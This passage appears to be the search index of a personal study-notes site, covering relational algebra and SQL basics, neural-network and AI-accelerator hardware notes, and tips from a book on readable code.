\u8fd4\u56de\u5173\u7cfb \\(r\\) \u4e2d\u6ee1\u8db3\u5173\u7cfb\u5f0f \\(p\\) \u7684\u5143\u7ec4\u7684\u5173\u7cfb \u6295\u5f71 \\(\\Pi_{A_1,A_2,\\dots,A_k(r)}\\) \u8fd4\u56de\u5173\u7cfb \\(r\\) \u4e2d\u5c5e\u6027\u4e3a \\(A_1,A_2,\\dots,A_k\\) \u7684\u5217\u5e76 \u53bb\u91cd \u96c6\u5408\u5e76 \\(r\\cup s\\) \u5c06\u4e24\u4e2a\u5c5e\u6027\u6570\u76f8\u7b49\u4e14\u6240\u6709\u5c5e\u6027\u7684\u57df\u76f8\u540c\u7684\u4e24\u4e2a\u5173\u7cfb\u5408\u5e76\u4e3a\u540c\u4e00\u4e2a\u5173\u7cfb\uff0c\u5e76 \u53bb\u91cd \u96c6\u5408\u5dee \\(r-s\\) \u8fd4\u56de\u5c5e\u4e8e\u5173\u7cfb \\(r\\) \u5374\u4e0d\u51fa\u73b0\u5728\u5173\u7cfb \\(s\\) \u4e2d\u7684\u5143\u7ec4\u7684\u5173\u7cfb \u7b1b\u5361\u5c14\u79ef \\(r\\times s\\) \u8fd4\u56de\u4efb\u610f\u4e24\u4e2a\u5173\u7cfb\u7684\u5143\u7ec4\u7ec4\u5408\uff08\u4e24\u4e2a\u5173\u7cfb\u7684\u5c5e\u6027\u5e94\u4e0d\u76f8\u4ea4\uff0c\u5426\u5219\u5e94\u91cd\u547d\u540d\uff09 \u91cd\u547d\u540d \\(\\rho_{x}(E)\\) \u5c06 \\(E\\) \u91cd\u547d\u540d\u4e3a \\(x\\) \u5e76\u8fd4\u56de","title":"\u57fa\u672c\u64cd\u4f5c"},{"location":"course/db/sql/algebra/#_2","text":"\u64cd\u4f5c \u8868\u8fbe\u5f0f \u542b\u4e49 \u96c6\u5408\u4ea4 \\(r\\cap s\\) \u53d6\u540c\u65f6\u51fa\u73b0\u5728\u4e24\u4e2a\u5173\u7cfb\u4e2d\u7684\u5143\u7ec4\uff0c\u53ef\u8f6c\u5316\u4e3a \\(r-(r-s)\\) \u81ea\u7136\u8fde\u63a5 \\(r\\bowtie s\\) \u53d6\u4e24\u4e2a\u5173\u7cfb\u516c\u5171\u5c5e\u6027\u4e2d\u5177\u6709 \u76f8\u540c\u5c5e\u6027\u503c \u7684\u5143\u7ec4\u8fdb\u884c\u62fc\u63a5 theta\u8fde\u63a5 \\(r\\bowtie_\\theta s\\) \u8fd4\u56de\u6ee1\u8db3\u5173\u7cfb\u5f0f \\(\\theta\\) \u7684\u81ea\u7136\u8fde\u63a5\u7ed3\u679c \u9664 \\(r\\div s\\) \\(r\\div s =\\{t \\vert t\\in\\Pi_{R-S}(r)\\cap \\forall u \\in s(tu\\in r)\\}\\) \u805a\u96c6 \\(_{G_1,G_2,\\dots, G_n}\\ \\mathcal{G}_{F_1(A_1),F_2(A_2),\\dots,F_n(A_n)}(r)\\) \\(G_i\\) \u662f\u7528\u4e8e\u5206\u7ec4\u7684\u5c5e\u6027\uff0c \\(F_i\\) \u662f\u805a\u96c6\u51fd\u6570\uff0c \\(A_i\\) \u662f\u5c5e\u6027\u540d \u8d4b\u503c \\(r\\leftarrow s\\) \u5c06\u53f3\u8fb9\u7684\u8ba1\u7b97\u7ed3\u679c\u8d4b\u503c\u7ed9\u5de6\u8fb9\u7684\u8868","title":"\u62d3\u5c55\u64cd\u4f5c"},{"location":"course/db/sql/sql/","text":"SQL Note \u5b66\u4e60\u63d0\u793a\uff1aSQL\u8fd9\u4e00\u5757\u7684\u77e5\u8bc6\uff0c\u8bb2\u7a76\u719f\u80fd\u751f\u5de7\uff0c\u6d89\u53ca\u7684\u8bed\u6cd5\u5f88\u591a\uff0c\u4f46\u4e0d\u9700\u8981\u5168\u90e8\u638c\u63e1\uff0c\u80fd\u89e3\u51b3\u5b9e\u9645\u9700\u6c42\u5c31\u884c\u3002 Data-Definition Language \u63d0\u4f9b\u5b9a\u4e49\u5173\u7cfb\u6a21\u5f0f\u3001\u5220\u9664\u5173\u7cfb\u4ee5\u53ca\u4fee\u6539\u5173\u7cfb\u6a21\u5f0f\u7684\u547d\u4ee4 create table table_name1 ( ID char ( 5 ), name varchar ( 5 ) not null , # \u7ea6\u675f\u975e\u7a7a\uff0c\u4e5f\u6709\u50cf unique\u8fd9\u6837\u7684\u9650\u5236 dept_name varchar ( 20 ), salary numeric ( 8 , 2 ), primary key ( ID ), # \u8bbe\u7f6e\u4e3b\u7801 foreign key ( dept_name ) references table_name2 , # \u8bbe\u7f6e\u5916\u7801 check ( salary >= 0 ) # check ( P ) \u786e\u4fdd\u8868\u8fbe\u5f0f P \u5728\u8be5\u5173\u7cfb\u4e2d\u7684\u5b58\u5728 ) drop table table_names; # \u5220\u9664\u8868\u53ca\u5185\u5bb9 delete table table_names; # \u4ec5\u5220\u9664\u8868\u7684\u5185\u5bb9 alter table table_names add extra_attribute int; # \u6dfb\u52a0\u5c5e\u6027 alter table table_names drop extra_attribute; # \u5220\u9664\u5c5e\u6027 Data-Manipulation Language(DML) \u67e5\u8be2 \u63d0\u4f9b\u67e5\u8be2\u4fe1\u606f\uff0c\u5728\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u5143\u7ec4\u3001\u5220\u9664\u5143\u7ec4\u3001\u4fee\u6539\u5143\u7ec4\u7684\u80fd\u529b\u3002 \u67e5\u8be2\u8bed\u53e5\u7684\u6267\u884c\u987a\u5e8f\u4e3a\uff1a \\(from\\to where\\to group(aggregate)\\to having \\to select \\to order by\\) \u67e5\u8be2\u51fd\u6570\u7684\u8303\u5f0f\uff1a \\[ \\begin{aligned} &{\\rm SELECT\\ <[DISTINCT]}\\ c_1, c_2, ...>\\\\ &{\\rm FROM}\\ <r_1, ...>\\\\ &{\\rm [WHERE\\ <}condition>]\\\\ &{\\rm [GROUP\\ BY }<c_1,c_2,...>[{\\rm HAVING}\\ <cond_2>]]\\\\ &{\\rm [ORDER\\ BY\\ <c_1\\ [DESC][,c_2[DESC|ASC],...]>]} \\end{aligned} \\] group\u64cd\u4f5c having\u76f8\u5f53\u4e8ewhere\u7684\u4f5c\u7528 \u805a\u5408\u51fd\u6570 avg/min/max/sum/count select cno from detail natural join pos where year ( detail . cdate ) = 2018 group by cno having count ( distinct campus ) = 1 ; Warning \u9700\u4fdd\u8bc1\u4efb\u4f55\u6ca1\u6709\u51fa\u73b0\u5728 group by \u5b50\u53e5\u4e2d\u7684\u5c5e\u6027\uff0c\u5982\u679c\u51fa\u73b0\u5728 select/having \u8bed\u53e5\u4e2d\uff0c\u5219\u5fc5\u987b\u5728\u805a\u96c6\u51fd\u6570\u4e2d\u3002 \u96c6\u5408\u8fd0\u7b97 except/union/intersect \u5dee\u96c6/\u5e76\u96c6/\u4ea4\u96c6 select title from movie except select title from movie where exists ( select * from comment A , comment B where A . title = movie . title and A . user_name = B . user_name and B . title = \u2019 the avenger \u2019 and A . grade <= B . grade ) \u5d4c\u5957\u5b50\u67e5\u8be2 in/not in: \u662f\u5426\u5728\u5b50\u67e5\u8be2\u4e2d exists: \u5b50\u67e5\u8be2\u662f\u5426\u4e3a\u7a7a all/some\uff1a \u6bd4\u8f83\u5927\u5c0f \u63d2\u5165/\u5220\u9664/\u4fee\u6539 # \u63d2\u5165 insert into table_name values (); # \u5220\u9664 delete from table_name where P ; # \u4fee\u6539 update r set attribute = ... where P # \u4fee\u6539 ( case ) update r set attributes = case when ... then ... when ... then ... ... else result end with\u5b50\u53e5 with max_budget ( value ) as ( select max ( budget ) from department ) select budget from department , max_budget where department . budget = max_budget . value \u521b\u5efa\u7d22\u5f15/\u89c6\u56fe # \u521b\u5efa\u7d22\u5f15 create index student_ID on student ( ID ); # \u521b\u5efa\u89c6\u56fe create view as < query expression > ; \u4e8b\u52a1 \u4e8b\u52a1\u7531\u67e5\u8be2\u548c\u66f4\u65b0\u8bed\u53e5\u7684\u5e8f\u5217\u7ec4\u6210 \u6388\u6743 grant / revoke < \u6743\u9650\u5217\u8868 > # \u5305\u62ec select , insert , update , delete on < \u5173\u7cfb\u540d\u6216\u89c6\u56fe\u540d > to < \u7528\u6237 / \u89d2\u8272\u5217\u8868 > ; \u6570\u636e\u7c7b\u578b \u5927\u5bf9\u8c61\u7c7b\u578b clob: \u5b57\u7b26\u6570\u636e\u7684\u5927\u5bf9\u8c61\u6570\u636e\u7c7b book_review clob (10KB) blob: \u4e8c\u8fdb\u5236\u6570\u636e\u7684\u5927\u5bf9\u8c61\u6570\u636e\u7c7b image blob (10MB) \u7528\u6237\u5b9a\u4e49\u65b0\u7c7b\u578b create type person_name as varchar(20) \u57df create domain dollars as numberic(12,2) not null \u53ef\u4ee5\u52a0\u5165\u7ea6\u675f\u6027\u6761\u4ef6","title":"SQL"},{"location":"course/db/sql/sql/#sql","text":"Note \u5b66\u4e60\u63d0\u793a\uff1aSQL\u8fd9\u4e00\u5757\u7684\u77e5\u8bc6\uff0c\u8bb2\u7a76\u719f\u80fd\u751f\u5de7\uff0c\u6d89\u53ca\u7684\u8bed\u6cd5\u5f88\u591a\uff0c\u4f46\u4e0d\u9700\u8981\u5168\u90e8\u638c\u63e1\uff0c\u80fd\u89e3\u51b3\u5b9e\u9645\u9700\u6c42\u5c31\u884c\u3002","title":"SQL"},{"location":"course/db/sql/sql/#data-definition-language","text":"\u63d0\u4f9b\u5b9a\u4e49\u5173\u7cfb\u6a21\u5f0f\u3001\u5220\u9664\u5173\u7cfb\u4ee5\u53ca\u4fee\u6539\u5173\u7cfb\u6a21\u5f0f\u7684\u547d\u4ee4 create table table_name1 ( ID char ( 5 ), name varchar ( 5 ) not null , # \u7ea6\u675f\u975e\u7a7a\uff0c\u4e5f\u6709\u50cf unique\u8fd9\u6837\u7684\u9650\u5236 dept_name varchar ( 20 ), salary numeric ( 8 , 2 ), primary key ( ID ), # \u8bbe\u7f6e\u4e3b\u7801 foreign key ( dept_name ) references table_name2 , # \u8bbe\u7f6e\u5916\u7801 check ( salary >= 0 ) # check ( P ) \u786e\u4fdd\u8868\u8fbe\u5f0f P \u5728\u8be5\u5173\u7cfb\u4e2d\u7684\u5b58\u5728 ) drop table table_names; # \u5220\u9664\u8868\u53ca\u5185\u5bb9 delete table table_names; # \u4ec5\u5220\u9664\u8868\u7684\u5185\u5bb9 alter table table_names add extra_attribute int; # \u6dfb\u52a0\u5c5e\u6027 alter table table_names drop extra_attribute; # \u5220\u9664\u5c5e\u6027","title":"Data-Definition Language"},{"location":"course/db/sql/sql/#data-manipulation-languagedml","text":"","title":"Data-Manipulation Language(DML)"},{"location":"course/db/sql/sql/#_1","text":"\u63d0\u4f9b\u67e5\u8be2\u4fe1\u606f\uff0c\u5728\u6570\u636e\u5e93\u4e2d\u63d2\u5165\u5143\u7ec4\u3001\u5220\u9664\u5143\u7ec4\u3001\u4fee\u6539\u5143\u7ec4\u7684\u80fd\u529b\u3002 \u67e5\u8be2\u8bed\u53e5\u7684\u6267\u884c\u987a\u5e8f\u4e3a\uff1a \\(from\\to where\\to group(aggregate)\\to having \\to select \\to order by\\) \u67e5\u8be2\u51fd\u6570\u7684\u8303\u5f0f\uff1a \\[ \\begin{aligned} &{\\rm SELECT\\ <[DISTINCT]}\\ c_1, c_2, ...>\\\\ &{\\rm FROM}\\ <r_1, ...>\\\\ &{\\rm [WHERE\\ <}condition>]\\\\ &{\\rm [GROUP\\ BY }<c_1,c_2,...>[{\\rm HAVING}\\ <cond_2>]]\\\\ &{\\rm [ORDER\\ BY\\ <c_1\\ [DESC][,c_2[DESC|ASC],...]>]} \\end{aligned} \\]","title":"\u67e5\u8be2"},{"location":"course/db/sql/sql/#group","text":"having\u76f8\u5f53\u4e8ewhere\u7684\u4f5c\u7528 \u805a\u5408\u51fd\u6570 avg/min/max/sum/count select cno from detail natural join pos where year ( detail . cdate ) = 2018 group by cno having count ( distinct campus ) = 1 ; Warning \u9700\u4fdd\u8bc1\u4efb\u4f55\u6ca1\u6709\u51fa\u73b0\u5728 group by \u5b50\u53e5\u4e2d\u7684\u5c5e\u6027\uff0c\u5982\u679c\u51fa\u73b0\u5728 select/having \u8bed\u53e5\u4e2d\uff0c\u5219\u5fc5\u987b\u5728\u805a\u96c6\u51fd\u6570\u4e2d\u3002","title":"group\u64cd\u4f5c"},{"location":"course/db/sql/sql/#_2","text":"except/union/intersect \u5dee\u96c6/\u5e76\u96c6/\u4ea4\u96c6 select title from movie except select title from movie where exists ( select * from comment A , comment B where A . title = movie . title and A . user_name = B . user_name and B . title = \u2019 the avenger \u2019 and A . grade <= B . grade )","title":"\u96c6\u5408\u8fd0\u7b97"},{"location":"course/db/sql/sql/#_3","text":"in/not in: \u662f\u5426\u5728\u5b50\u67e5\u8be2\u4e2d exists: \u5b50\u67e5\u8be2\u662f\u5426\u4e3a\u7a7a all/some\uff1a \u6bd4\u8f83\u5927\u5c0f","title":"\u5d4c\u5957\u5b50\u67e5\u8be2"},{"location":"course/db/sql/sql/#_4","text":"# \u63d2\u5165 insert into table_name values (); # \u5220\u9664 delete from table_name where P ; # \u4fee\u6539 update r set attribute = ... where P # \u4fee\u6539 ( case ) update r set attributes = case when ... then ... when ... then ... ... else result end","title":"\u63d2\u5165/\u5220\u9664/\u4fee\u6539"},{"location":"course/db/sql/sql/#with","text":"with max_budget ( value ) as ( select max ( budget ) from department ) select budget from department , max_budget where department . budget = max_budget . value","title":"with\u5b50\u53e5"},{"location":"course/db/sql/sql/#_5","text":"# \u521b\u5efa\u7d22\u5f15 create index student_ID on student ( ID ); # \u521b\u5efa\u89c6\u56fe create view as < query expression > ;","title":"\u521b\u5efa\u7d22\u5f15/\u89c6\u56fe"},{"location":"course/db/sql/sql/#_6","text":"\u4e8b\u52a1\u7531\u67e5\u8be2\u548c\u66f4\u65b0\u8bed\u53e5\u7684\u5e8f\u5217\u7ec4\u6210","title":"\u4e8b\u52a1"},{"location":"course/db/sql/sql/#_7","text":"grant / revoke < \u6743\u9650\u5217\u8868 > # \u5305\u62ec select , insert , update , delete on < \u5173\u7cfb\u540d\u6216\u89c6\u56fe\u540d > to < \u7528\u6237 / \u89d2\u8272\u5217\u8868 > ;","title":"\u6388\u6743"},{"location":"course/db/sql/sql/#_8","text":"\u5927\u5bf9\u8c61\u7c7b\u578b clob: \u5b57\u7b26\u6570\u636e\u7684\u5927\u5bf9\u8c61\u6570\u636e\u7c7b book_review clob (10KB) blob: \u4e8c\u8fdb\u5236\u6570\u636e\u7684\u5927\u5bf9\u8c61\u6570\u636e\u7c7b image blob (10MB) \u7528\u6237\u5b9a\u4e49\u65b0\u7c7b\u578b create type person_name as varchar(20) \u57df create domain dollars as numberic(12,2) not null \u53ef\u4ee5\u52a0\u5165\u7ea6\u675f\u6027\u6761\u4ef6","title":"\u6570\u636e\u7c7b\u578b"},{"location":"misc/","text":"Introduction \u5728\u8fd9\u91cc\u4f1a\u653e\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f\u3002","title":"Introduction"},{"location":"misc/#introduction","text":"\u5728\u8fd9\u91cc\u4f1a\u653e\u4e00\u4e9b\u6742\u4e03\u6742\u516b\u7684\u4e1c\u897f\u3002","title":"Introduction"},{"location":"misc/ann/","text":"Artificial Neural Network Info \u4e3b\u8981\u6458\u81ea\u300aAscend AI Processor Architecture and Programming: Principles and Applications of CANN\u300b\u4e2d\u57fa\u7840\u7406\u8bba\u65b9\u9762\u7684\u4ecb\u7ecd\u3002 0 Neuron model The most basic unit in a biological neural network is a neuron, and its structure is shown in the following image. In the original mechanism of biological neural networks, each neuron has multiple dendrites, one axon, and one cell body. And then, it can be abstracted into a more mathematical model, called M-P neuron model 1 Perception 1.1 Single Perceptron The perceptron can only deal with linear classification problems , and the output results are limited to 0 and 1. 1.2 Multilayer perceptron This deep structure is called multilayer perceptron (MLP), also known as a fully connected neural network (FCNN). An MLP can classify an input into multiple categories . 2 Convolutional Neural Network CNNs require three processes: build the network architecture, train the network, and perform inference. For a specific application, a hierarchical architecture of CNNs, including an input layer, convolution layers , pooling layers , fully connected layers , and output layer, are required. 2.1 Convolution layers The convolution kernel weights generally use a matrix of size 1x1, 3x3, or 7x7, and the weight of each convolution kernel is shared by all convolution windows on the input feature map. 2.2 Pooling layers Background the number of neurons increases, and amouts of parameters need to be trained. the overfitting problem. The pooling layer typically uses a filter to extract representative features for diffterent locations. 2.3 Fully connected layers A fully connected layer is equivalent to an MLP, which performs classification upon input features. 2.4 Parallelism Synaptic parallelism: For convolution kernels of size \\(K\\times K\\) , the maximum synaptic parallelism is also \\(K\\times K\\) . Neuron parallelism: Each of the convolution windows has no data dependency upon the other and thus can be computed in parallel. Input feature map parallelism: the maximum parallelism for an input image with N channels is N. Output feature map parallelism: Just same as the input feature map parallelism Batch parallelism: In the practical application of CNNs, in order to make full use of the bandwidth and computing power of the hardware, more than one image are processed at a time, which form a batch. 3 Neural network processor acceleration theory 3.1 GPU acceleration theory The major ways to accelerate neural networks with GPUs are through parallelization and vectorization . The vectorization approach can be illustrated by the following diagram. And the multiplication and addition operations can be parallezed and processed by parallel computing components. With the development of the GPU industry, more and more GPUs with modern architecure have been develeped. Like the Turing Stream Processor . The most important part of the Turing Stream Processor is Tensor Core \uff0cand each tensor core can perform 64 times of fused multiply and add (FMA) operations with the precision of FP16 in one clock cycle. 3.2 TPU acceleration theory The way in which the convolution is computed in the TPU is different from that of the GPU, which mainly relies on a hardware circuit structure called \u201csystolic array.\u201d As shown in the following figure. And the \"systolic array\" is a simple and regular but practical design. 3.3 DaVinci architecture Unlike traditional CPUs and GPUs that support general-purpose computing, or ASIC processors dedicated to a particular algorithm, the DaVinci architecture is designed to adapt to common applications and algorithms within a particular field, commonly referred to as \u201cdomain-specific architecture (DSA)\u201d processors. It includes three basic computing resources: Cube Unit, Vector Unit and Scalar Unit . These three computing units correspond to three common computing modes: tensor, vector and scalar . Cube Unit (CU) provides powerful parallel multiplication and addition computations, enabling AI Core to finish matrix computations rapidly. Through the elaborate design of customized circuits and aggressive back-end optimizations, the Cube Unit can complete the multiplication operation of two \\(16\\times16\\) matrices with one instruction (referred to as \\(16^3\\) , also the name origin of Cube). Note that the Matrix B is Column-Major.(To accelerate access efficiency) Moreover, if the matrix is even bigger, we can use the partitioning method. Thus, how can we apply CUBE to convolution acceleration? The matries will be transformed into columns( Img2Col ), which can be treated as a new matrix. And then the convolution is converted to matrix multiplication.","title":"Artificial Neural Network"},{"location":"misc/ann/#artificial-neural-network","text":"Info \u4e3b\u8981\u6458\u81ea\u300aAscend AI Processor Architecture and Programming: Principles and Applications of CANN\u300b\u4e2d\u57fa\u7840\u7406\u8bba\u65b9\u9762\u7684\u4ecb\u7ecd\u3002","title":"Artificial Neural Network"},{"location":"misc/ann/#0-neuron-model","text":"The most basic unit in a biological neural network is a neuron, and its structure is shown in the following image. In the original mechanism of biological neural networks, each neuron has multiple dendrites, one axon, and one cell body. And then, it can be abstracted into a more mathematical model, called M-P neuron model","title":"0 Neuron model"},{"location":"misc/ann/#1-perception","text":"","title":"1 Perception"},{"location":"misc/ann/#11-single-perceptron","text":"The perceptron can only deal with linear classification problems , and the output results are limited to 0 and 1.","title":"1.1 Single Perceptron"},{"location":"misc/ann/#12-multilayer-perceptron","text":"This deep structure is called multilayer perceptron (MLP), also known as a fully connected neural network (FCNN). An MLP can classify an input into multiple categories .","title":"1.2 Multilayer perceptron"},{"location":"misc/ann/#2-convolutional-neural-network","text":"CNNs require three processes: build the network architecture, train the network, and perform inference. For a specific application, a hierarchical architecture of CNNs, including an input layer, convolution layers , pooling layers , fully connected layers , and output layer, are required.","title":"2 Convolutional Neural Network"},{"location":"misc/ann/#21-convolution-layers","text":"The convolution kernel weights generally use a matrix of size 1x1, 3x3, or 7x7, and the weight of each convolution kernel is shared by all convolution windows on the input feature map.","title":"2.1 Convolution layers"},{"location":"misc/ann/#22-pooling-layers","text":"Background the number of neurons increases, and amouts of parameters need to be trained. the overfitting problem. The pooling layer typically uses a filter to extract representative features for diffterent locations.","title":"2.2 Pooling layers"},{"location":"misc/ann/#23-fully-connected-layers","text":"A fully connected layer is equivalent to an MLP, which performs classification upon input features.","title":"2.3 Fully connected layers"},{"location":"misc/ann/#24-parallelism","text":"Synaptic parallelism: For convolution kernels of size \\(K\\times K\\) , the maximum synaptic parallelism is also \\(K\\times K\\) . Neuron parallelism: Each of the convolution windows has no data dependency upon the other and thus can be computed in parallel. Input feature map parallelism: the maximum parallelism for an input image with N channels is N. Output feature map parallelism: Just same as the input feature map parallelism Batch parallelism: In the practical application of CNNs, in order to make full use of the bandwidth and computing power of the hardware, more than one image are processed at a time, which form a batch.","title":"2.4 Parallelism"},{"location":"misc/ann/#3-neural-network-processor-acceleration-theory","text":"","title":"3 Neural network processor acceleration theory"},{"location":"misc/ann/#31-gpu-acceleration-theory","text":"The major ways to accelerate neural networks with GPUs are through parallelization and vectorization . The vectorization approach can be illustrated by the following diagram. And the multiplication and addition operations can be parallezed and processed by parallel computing components. With the development of the GPU industry, more and more GPUs with modern architecure have been develeped. Like the Turing Stream Processor . The most important part of the Turing Stream Processor is Tensor Core \uff0cand each tensor core can perform 64 times of fused multiply and add (FMA) operations with the precision of FP16 in one clock cycle.","title":"3.1 GPU acceleration theory"},{"location":"misc/ann/#32-tpu-acceleration-theory","text":"The way in which the convolution is computed in the TPU is different from that of the GPU, which mainly relies on a hardware circuit structure called \u201csystolic array.\u201d As shown in the following figure. And the \"systolic array\" is a simple and regular but practical design.","title":"3.2 TPU acceleration theory"},{"location":"misc/ann/#33-davinci-architecture","text":"Unlike traditional CPUs and GPUs that support general-purpose computing, or ASIC processors dedicated to a particular algorithm, the DaVinci architecture is designed to adapt to common applications and algorithms within a particular field, commonly referred to as \u201cdomain-specific architecture (DSA)\u201d processors. It includes three basic computing resources: Cube Unit, Vector Unit and Scalar Unit . These three computing units correspond to three common computing modes: tensor, vector and scalar . Cube Unit (CU) provides powerful parallel multiplication and addition computations, enabling AI Core to finish matrix computations rapidly. Through the elaborate design of customized circuits and aggressive back-end optimizations, the Cube Unit can complete the multiplication operation of two \\(16\\times16\\) matrices with one instruction (referred to as \\(16^3\\) , also the name origin of Cube). Note that the Matrix B is Column-Major.(To accelerate access efficiency) Moreover, if the matrix is even bigger, we can use the partitioning method. Thus, how can we apply CUBE to convolution acceleration? The matries will be transformed into columns( Img2Col ), which can be treated as a new matrix. And then the convolution is converted to matrix multiplication.","title":"3.3 DaVinci architecture"},{"location":"misc/code/","text":"The Art of the Readable Code Info \u672c\u7bc7\u7b14\u8bb0\u4e3b\u8981\u6458\u81ea\u300a\u7f16\u5199\u53ef\u8bfb\u4ee3\u7801\u7684\u827a\u672f\u300b\uff08The Art of Readable Code\uff09\u3002\u6709\u591a\u5e74\u5de5\u7a0b\u4ee3\u7801\u7f16\u7a0b\u7ecf\u9a8c\u7684\u4f5c\u8005\uff0c\u7531\u6d45\u5165\u6df1\u5730\u4ecb\u7ecd\u4e86\u5982\u4f55\u7f16\u5199\u53ef\u8bfb\u4ee3\u7801\u7684\u6280\u5de7\u4e0e\u539f\u5219\uff0c\u4ece\u4ee3\u7801\u98ce\u683c\u5230\u903b\u8f91\u6846\u67b6\u7684\u6784\u5efa\uff0c\u7ed9\u51fa\u4e86\u4e0d\u5c11\u5b9e\u7528\u7684\u5efa\u8bae\u3002 1 \u8868\u9762\u5c42\u6b21\u7684\u6539\u8fdb 1.1 \u8d77\u540d\u7684\u827a\u672f \ud83d\udca1\u5efa\u8bae\u4e00\uff1a\u907f\u514d\u7a7a\u6d1e\u7684\u8bcd\u6c47\uff0c\u6bd4\u5982\uff1a get , size ...\uff0c\u53ef\u66ff\u6362\u6210 height , fetch , load ... \u5355\u8bcd \u66f4\u591a\u9009\u62e9 send deliver, dispatch, distribute find search, extract, locate start create, begin, open make create, build, add \ud83d\udca1\u5efa\u8bae\u4e8c\uff1a\u6b63\u786e\u4f7f\u7528\u7279\u6b8a\u8bcd\u6c47\u3002 \u6bd4\u5982\u7d22\u5f15\u548c\u8fed\u4ee3\u5668\uff1a i \uff0c j \uff0c it ...\uff1b\u6216\u8005\u4e34\u65f6\u53d8\u91cf tmp ... \u5728\u5faa\u73af\u4e2d\uff0c\u4e3a\u4f7f\u5f97\u4e0d\u4f1a\u9519\u4f4d\u4f7f\u7528\u8fed\u4ee3\u5668\uff0c\u53ef\u4ee5\u5728\u8fed\u4ee3\u5668\u4e2d\u52a0\u5165\u76f8\u5173\u4fe1\u606f\uff0c\u5982 number_i \uff0c club_i \u3002 \ud83d\udca1\u5efa\u8bae\u4e09\uff1a\u7ed9\u540d\u5b57\u9644\u4e0a\u989d\u5916\u7684\u4fe1\u606f\u3002 \u5df2\u8f6c\u5316\u4e3a UTF-8 \u683c\u5f0f \u7684 html \u5b57\u8282\uff1a html_utf8 \u7a0b\u5e8f\u5f00\u59cb\u65f6\u95f4\uff0c\u4ee5\u6beb\u79d2\u4e3a \u5355\u4f4d \uff1a start_ms \ud83d\udca1\u5efa\u8bae\u56db\uff1a\u4e0d\u5b9c\u8fc7\u957f\u3002 \u5f53\u7136\u5728\u53d8\u91cf\u4e2d\u4e00\u5473\u5730\u5b58\u50a8\u4fe1\u606f\u4e5f\u662f\u4e0d\u5f97\u5f53\u7684\uff0c\u4e0d\u7136\u5c31\u53ef\u80fd\u4f1a\u4f7f\u5b83\u53c8\u81ed\u53c8\u957f\uff0c\u53ef\u4ee5\u9002\u5f53\u4f7f\u7528\u4e00\u4e9b\u65b9\u6cd5\u4f7f\u5176\u7f29\u77ed\u3002 \u4f7f\u7528\u9996\u5b57\u6bcd\u7f29\u7565\u8bcd\uff1a\u4f46\u4ec5\u4ec5\u5e94\u7528\u4e8e\u7ea6\u5b9a\u4fd7\u6210\u7684\u7f29\u5199\uff0c\u5982 evaluation -> eval \uff0c documentation -> doc \u3002\u4e66\u4e2d\u63d0\u51fa\u4e86\u4e00\u4e2a\u5f88\u76f4\u622a\u4e86\u5f53\u7684\u4f7f\u7528\u573a\u666f\u5224\u65ad\u65b9\u6cd5\uff1a\u8ba9\u8fd9\u4e9b\u7f29\u5199\u5bf9\u9879\u76ee\u7684 \u65b0\u6210\u5458 \u6765\u8bf4 \u4e0d\u964c\u751f\u548c\u8d39\u89e3 \u3002 \u4e22\u6389\u6ca1\u7528\u7684\u8bcd\u6c47\uff0c\u5982 ConvertToString -> ToString \u3002 \ud83d\udca1\u5efa\u8bae\u4e94\uff1a\u5728\u5c0f\u7684\u4f5c\u7528\u57df\u4e2d\u4f7f\u7528\u8f83\u77ed\u7684\u540d\u5b57\uff1b\u76f8\u53cd\uff0c\u4f5c\u7528\u57df\u5927\u7684\u8bcd\u6c47\u5e94\u5c3d\u53ef\u80fd\u957f\u4e14\u8be6\u7ec6\u3002 \ud83d\udca1\u5efa\u8bae\u516d\uff1a\u907f\u514d\u6b67\u4e49\u3002 \u5efa\u8bae\u867d\u77ed\uff0c\u4f46\u5176\u5b9e\u5f88\u96be\u505a\u5230\u5b8c\u7f8e\u3002\u6bd4\u5982\u5bf9\u4e8e\u5e03\u5c14\u503c\uff0c bool read_password = true \uff0c\u5c31\u5bb9\u6613\u4ea7\u751f\u4e24\u79cd\u610f\u601d\uff1a1\uff09\u8981\u53bb\u8bfb\u5bc6\u7801 2\uff09\u5df2\u7ecf\u8bfb\u5165\u5bc6\u7801\uff0c\u6b64\u65f6\u5c31\u53ef\u4ee5\u901a\u8fc7 need_password \u6216 user_is_authenticated \u66ff\u4ee3\u3002 1.2 \u6392\u7248 \u4e66\u4e2d\u6b64\u5757\u7684\u5185\u5bb9\u662f\u300a\u5ba1\u7f8e\u300b\uff0c\u4f46\u603b\u4f53\u662f\u548c\u4ee3\u7801\u6392\u7248\u76f8\u5173\u7684\uff0c\u6240\u4ee5\u4f7f\u7528\u6392\u7248\u4f5c\u4e3a\u6982\u62ec\u53ef\u80fd\u66f4\u4e3a\u6070\u5f53\u3002\u9996\u5148\uff0c\u4e66\u4e2d\u63d0\u51fa\u4e86\u4e09\u6761\u539f\u5219\uff1a \u4f7f\u7528\u4e00\u81f4\u7684\u5e03\u5c40\uff0c\u8ba9\u8bfb\u8005\u80fd\u5feb\u901f\u9002\u5e94 \u5f53\u76f8\u4f3c\u7684\u4ee3\u7801\u5c3d\u53ef\u80fd\u76f8\u4f3c \u628a\u76f8\u5173\u7684\u4ee3\u7801\u5206\u7ec4\uff0c\u5f62\u6210\u4ee3\u7801\u5757 \u5177\u4f53\u800c\u8a00\uff0c\u4e3a\u4e86\u8ba9\u4ee3\u7801\u53d8\u5f97\u6574\u9f50\uff0c\u6211\u4eec\u6709\u5982\u4e0b\u53ef\u4ee5\u53c2\u8003\u7684\u65b9\u6cd5\u3002 \ud83d\udca1\u65b9\u6cd5\u4e00\uff1a\u4f7f\u7528\u51fd\u6570\u3002 \u5c31\u5982\u4e66\u4e2d\u4e09\u6761\u539f\u5219\u4e2d\u7684\u7b2c\u4e8c\u6761\uff0c\u6211\u4eec\u5e94\u5f53\u8ba9\u76f8\u4f3c\u529f\u80fd\u7684\u4ee3\u7801\u5728\u5916\u89c2\u4e0a\u4e5f\u5c3d\u53ef\u80fd\u76f8\u4f3c\u3002 assert ( ExpendFullName ( database_connection , \"Doug Adams\" , & error ) == \"Mr. Douglas Adams\" ); assert ( error == \"\" ); assert ( ExpendFullName ( database_connection , \"Jake Brown\" , & error ) == \"Mr. Jocob Brown III\" ); assert ( error == \"\" ); assert ( ExpendFullName ( database_connection , \"No Such Guy\" , & error ) == \"\" ); assert ( error == \"on match found\" ); assert ( ExpendFullName ( database_connection , \"John\" , & error ) == \"\" ); assert ( error == \"more than one result\" ); 